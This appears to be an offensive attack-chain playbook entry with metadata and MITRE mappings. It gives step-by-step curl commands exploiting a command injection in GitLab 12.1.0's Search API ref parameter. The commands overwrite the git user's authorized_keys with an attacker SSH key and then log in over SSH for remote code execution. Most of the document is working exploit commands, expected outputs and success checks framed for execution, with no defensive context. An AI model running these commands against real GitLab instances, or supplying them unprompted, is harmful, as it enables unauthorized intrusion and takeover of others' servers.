---
tags:
  - command-injection
  - gitlab
  - rce
  - ssh
  - file-overwrite
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/ssh]]'
  - '[[tools/cat]]'
  - '[[tools/git]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Wiki-Page-with-Controlled-Commit]]'
  - '[[procedures/Exploit-Search-API-Command-Injection]]'
  - '[[procedures/Generate-and-Inject-SSH-Key]]'
  - '[[procedures/Overwrite-Authorized-Keys-via-API]]'
  - '[[procedures/Gain-SSH-Access-as-Git-User]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:24:15.351Z'
description: >-
  Multi-stage attack exploiting command injection in GitLab's Search API to
  overwrite authorized_keys with an attacker-controlled SSH public key, enabling
  remote access as the git user.
skill_level: intermediate
impact_level: high
id: 3e214224-c422-4187-b76d-b0d4092110b6
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
  - '[[External Remote Services]]'
---
# GitLab Search API Command Injection Leading to Remote Code Execution via SSH Key Injection

Multi-stage attack chain exploiting unsanitized `ref` parameter in GitLab's Search API for wiki_blobs scope, allowing command injection into git commands for arbitrary local file overwrites. This enables injecting an SSH public key into authorized_keys to gain remote access as the git user, resulting in remote code execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Wiki Page] --> B[Inject Command to Test Overwrite]
    B --> C[Generate SSH Key and Inject into Commit]
    C --> D[Overwrite authorized_keys]
    D --> E[SSH Access and RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/ssh]]
- [[tools/cat]]
- [[tools/git]]

### Target Environment

- GitLab 12.1.0 on Linux (Ubuntu 16.04)
- Access to GitLab API with a private token (developer or higher role)
- Network access to GitLab instance (e.g., http://gitlab-vm.local)

### Initial Access Requirements

- Valid GitLab personal access token ($TOKEN)
- Project ID with wiki enabled (e.g., project 5)
- No root access required initially; exploits authenticated API

## Detailed Attack Procedures

### Step 1: Create Initial Wiki Page
procedure: [[procedures/Create-Wiki-Page-with-Controlled-Commit]]

**Objective**: Establish a wiki page with a controlled commit message to use as payload for file overwrites.

**Instructions**: Use the GitLab API or UI to create a wiki page named 'page' with a commit message containing controlled content, such as 'test payload'.

**Expected Output**: Wiki page created, commit logged with the controlled message.

**Success Indicators**:
- Wiki page visible in project
- Commit message verifiable via git log

### Step 2: Test Command Injection
procedure: [[procedures/Exploit-Search-API-Command-Injection]]

**Objective**: Inject git flags via the `ref` parameter to overwrite a test file, confirming the vulnerability.

**Instructions**: Execute [[commands/curl-gitlab-search-wiki-injection]] to trigger the injection:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

Then verify with [[commands/cat-tmp-file]]:

```bash
cat /tmp/file
```

**Expected Output**: /tmp/file contains the commit log with 'controlled content'.

**Success Indicators**:
- File /tmp/file created
- Contents match commit message

### Step 3: Prepare SSH Key
procedure: [[procedures/Generate-and-Inject-SSH-Key]]

**Objective**: Generate an RSA key pair and create a new wiki page using the public key as the commit message for payload control.

**Instructions**: Generate key pair using [[tools/git]] or ssh-keygen (not shown in commands, but inferred), then create a new wiki page with the public key in the commit message.

**Expected Output**: New commit with public key in message.

**Success Indicators**:
- Key pair generated
- Wiki page commit verifiable

### Step 4: Overwrite Authorized Keys
procedure: [[procedures/Overwrite-Authorized-Keys-via-API]]

**Objective**: Use the injection to overwrite /var/opt/gitlab/.ssh/authorized_keys with the attacker's public key.

**Instructions**: Run [[commands/curl-gitlab-authorized-keys-injection]]:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/{id}/search?scope=wiki_blobs&search={term}&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
```

Search term should match the wiki page with the key.

**Expected Output**: authorized_keys overwritten with public key from commit.

**Success Indicators**:
- File updated (verifiable post-access)
- No API errors

### Step 5: Gain Remote Access
procedure: [[procedures/Gain-SSH-Access-as-Git-User]]

**Objective**: SSH into the GitLab server as the git user using the injected key for RCE.

**Instructions**: Use [[commands/ssh-gitlab-access]]:

```bash
ssh git@gitlab-vm.local -i gitlab
```

Verify with [[commands/id-user-check]] and [[commands/cat-authorized-keys]]:

```bash
id
cat /var/opt/gitlab/.ssh/authorized_keys
```

**Expected Output**: Successful login as uid=998(git), authorized_keys shows injected key.

**Success Indicators**:
- SSH connection established
- User confirmed as git
- Key visible in authorized_keys

## Attack Chain Summary

### Key Achievements

1. Confirmed command injection in GitLab Search API
2. Achieved arbitrary local file overwrite with controlled content
3. Gained persistent remote access as git user
4. Enabled full RCE on the GitLab server

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Unix Shell]]
- [[External Remote Services]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Privilege Escalation]]

---

*Last updated: 2023-10-01T00:00:00Z*
